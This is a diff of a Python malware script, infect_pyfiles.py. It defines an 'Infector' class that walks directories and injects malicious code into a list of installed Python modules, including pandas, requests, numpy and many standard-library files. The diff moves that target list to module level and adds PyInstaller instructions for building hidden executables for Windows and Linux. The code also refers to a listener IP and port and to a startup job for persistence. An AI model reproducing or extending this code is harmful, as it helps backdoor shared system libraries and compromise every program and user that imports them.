@@ -6,43 +6,49 @@ from platform import system
 from re import search
 from base64 import b64encode, b64decode
 from subprocess import run, PIPE
-# compile with:
+
+# ** pip3 install pytinstaller **
+
+# compile for Windows:
 # pyinstaller --onefile --noconsole infect_pyfiles.py
+
+# compile for Linux:
+# pyinstaller --onefile infect_pyfiles.py
 
 # creating job that runs on startup on Windows
 # https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/
 
+target_python_modules = (
+    "/usr/lib/python3/dist-packages/pandas/__init__.py",
+    "/usr/lib/python3/dist-packages/requests/__init__.py",
+    "/usr/lib/python3/dist-packages/numpy/__init__.py",
+    "/usr/lib/python3.8/tkinter/__init__.py",
+    "/usr/lib/python3.8/datetime.py",
+    "/usr/lib/python3.8/abc.py",
+    "/usr/lib/python3.8/argparse.py",
+    "/usr/lib/python3.8/asyncio/__init__.py",
+    "/usr/lib/python3.8/collections/__init__.py",
+    "/usr/lib/python3.8/copy.py",
+    "/usr/lib/python3.8/csv.py",
+    "/usr/lib/python3.8/decimal.py",
+    "/usr/lib/python3.8/functools.py",
+    "/usr/lib/python3.8/http/__init__.py",
+    "/usr/lib/python3.8/importlib/__init__.py",
+    "/usr/lib/python3.8/inspect.py",
+    "/usr/lib/python3.8/json/__init__.py",
+    "/usr/lib/python3.8/pdb.py",
+    "/usr/lib/python3.8/random.py",
+    "/usr/lib/python3.8/shutil.py",
+    "/usr/lib/python3.8/types.py",
+    "/usr/lib/python3.8/unittest/__init__.py",
+    "/usr/lib/python3.8/urllib/__init__.py",
+    "/usr/lib/python3.8/uuid.py"
+)
 class Infector:
     def __init__(self):
         self.SYSTEM:str = system()
         self.IP:str = "0.0.0.0"
         self.PORT:int = 1025
-        target_python_modules = (
-            "/usr/lib/python3/dist-packages/pandas/__init__.py",
-            "/usr/lib/python3/dist-packages/requests/__init__.py",
-            "/usr/lib/python3/dist-packages/numpy/__init__.py",
-            "/usr/lib/python3.8/tkinter/__init__.py",
-            "/usr/lib/python3.8/datetime.py",
-            "/usr/lib/python3.8/abc.py",
-            "/usr/lib/python3.8/argparse.py",
-            "/usr/lib/python3.8/asyncio/__init__.py",
-            "/usr/lib/python3.8/collections/__init__.py",
-            "/usr/lib/python3.8/copy.py",
-            "/usr/lib/python3.8/csv.py",
-            "/usr/lib/python3.8/decimal.py",
-            "/usr/lib/python3.8/functools.py",
-            "/usr/lib/python3.8/http/__init__.py",
-            "/usr/lib/python3.8/importlib/__init__.py",
-            "/usr/lib/python3.8/inspect.py",
-            "/usr/lib/python3.8/json/__init__.py",
-            "/usr/lib/python3.8/pdb.py",
-            "/usr/lib/python3.8/random.py",
-            "/usr/lib/python3.8/shutil.py",
-            "/usr/lib/python3.8/types.py",
-            "/usr/lib/python3.8/unittest/__init__.py",
-            "/usr/lib/python3.8/urllib/__init__.py",
-            "/usr/lib/python3.8/uuid.py"
-        )
 
     def infect_file(self, target_file:str):
         """Infects Python file with malicious Python code to create
@@ -85,7 +91,7 @@ class Infector:
                 divider:chr = "/" if self.SYSTEM == "Linux" else "\\"
                 for file_ in glob(root+divider+"*.py"):
                     if file_ == root+divider+__file__: continue
-                    if file_ in self.target_python_modules:
+                    if file_ in target_python_modules:
                         self.infect_file(file_) 
         
     def create_job(self):
